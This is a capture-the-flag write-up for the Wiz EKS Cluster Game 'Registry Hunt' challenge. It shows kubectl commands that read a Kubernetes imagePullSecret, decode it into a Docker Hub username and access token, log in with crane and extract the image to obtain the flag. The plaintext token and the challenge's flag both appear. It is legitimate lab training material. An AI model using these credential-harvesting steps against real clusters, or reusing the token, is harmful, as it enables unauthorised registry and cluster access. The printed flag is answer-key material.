---
tags:
  - Container-Registry
title: EKS Cluster Game - Registry Hunt
description: imagePullSecret is not actually a secret
reference: https://eksclustergames.com/challenge/2
---

## Challenge

A thing we learned during our research: always check the container registries.

For your convenience, the [crane](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md) utility is already pre-installed on the machine.

## Solution

### 1. check the pod spec

- the container image registry is `docker.io`.
- the `kubernetes.io/psp: eks.privileged` seems imply the pod can access the worker node resource.

```
root@wiz-eks-challenge:~# kubectl get pods -n challenge2 -o yaml
apiVersion: v1
items:
- apiVersion: v1
  kind: Pod
  metadata:
    annotations:
      kubernetes.io/psp: eks.privileged
      pulumi.com/autonamed: "true"
    creationTimestamp: "2023-11-01T13:32:05Z"
    name: database-pod-2c9b3a4e
    namespace: challenge2
    resourceVersion: "230430041"
    uid: 57fe7d43-5eb3-4554-98da-47340d94b4a6
```

### 2. try `k exec`, `k debug`, and `k get sa`

Forbidden.

```
root@wiz-eks-challenge:~# kubectl exec -it database-pod-2c9b3a4e -n challenge2 -- bash
Error from server (Forbidden): pods "database-pod-2c9b3a4e" is forbidden: User "system:serviceaccount:challenge2:service-account-challenge2" cannot create resource "pods/exec" in API group "" in the namespace "challenge2"
root@wiz-eks-challenge:~# kubectl get sa -n challenge2
Error from server (Forbidden): serviceaccounts is forbidden: User "system:serviceaccount:challenge2:service-account-challenge2" cannot list resource "serviceaccounts" in API group "" in the namespace "challenge2"
root@wiz-eks-challenge:~# kubectl debug  -it database-pod-2c9b3a4e -n challenge2 --image=busybox
Defaulting debug container name to debugger-4phh5.
Error from server (Forbidden): pods "database-pod-2c9b3a4e" is forbidden: User "system:serviceaccount:challenge2:service-account-challenge2" cannot patch resource "pods/ephemeralcontainers" in API group "" in the namespace "challenge2"
```

### 3. try to get the imagePullSecret

Nice! We can get the imagePullSecret.

Note: we cant get all the k8s secrets.

```
root@wiz-eks-challenge:~# kubectl get pods -o yaml | grep imagePullSe -A 3
    imagePullSecrets:
    - name: registry-pull-secrets-780bab1d
    nodeName: ip-192-168-21-50.us-west-1.compute.internal
    preemptionPolicy: PreemptLowerPriority
root@wiz-eks-challenge:~# kubectl get secrets registry-pull-secrets-780bab1d -o yaml
apiVersion: v1
data:
  .dockerconfigjson: eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19
kind: Secret
metadata:
  annotations:
    pulumi.com/autonamed: "true"
  creationTimestamp: "2023-11-01T13:31:29Z"
  name: registry-pull-secrets-780bab1d
  namespace: challenge2
  resourceVersion: "897340"
  uid: 1348531e-57ff-42df-b074-d9ecd566e18b
type: kubernetes.io/dockerconfigjson
root@wiz-eks-challenge:~# kubectl get secrets -o yaml
apiVersion: v1
items: []
kind: List
metadata:
  resourceVersion: ""
Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:challenge2:service-account-challenge2" cannot list resource "secrets" in API group "" in the namespace "challenge2"
```

### 4. decode the secret for getting the username and password for login 

```
root@wiz-eks-challenge:~# echo eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19 | base64 -d                        
{"auths": {"index.docker.io/v1/": {"auth": "ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw=="}}}root@wiz-eks-challenge:~# echo "ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw==" | base64 -d
root@wiz-eks-challenge:~# echo "ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw==" | base64 -d
eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCoroot@wiz-eks-challenge:~# crane auth login index.docker.io -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo
2025/05/16 14:52:19 logged in via /home/user/.docker/config.json
```

### 5. get the image's filesystem

```
root@wiz-eks-challenge:~# crane export index.docker.io/eksclustergames/base_ext_image:latest base_ext_image.tar.gz
root@wiz-eks-challenge:~# mkdir root
root@wiz-eks-challenge:~# tar -xf base_ext_image.tar.gz -C root
tar: home: Cannot change ownership to uid 65534, gid 65534: Invalid argument
tar: usr/sbin: Cannot change ownership to uid 1, gid 1: Invalid argument
tar: var/spool/mail: Cannot change ownership to uid 8, gid 8: Invalid argument
tar: Exiting with failure status due to previous errors
root@wiz-eks-challenge:~# ls
access_token  b.tar.gz  base_ext_image.tar.gz  latest  root
root@wiz-eks-challenge:~# cd root/
root@wiz-eks-challenge:~/root# ls
bin  dev  etc  flag.txt  home  lib  lib64  proc  root  sys  tmp  usr  var
root@wiz-eks-challenge:~/root# cat flag.txt 
wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}
```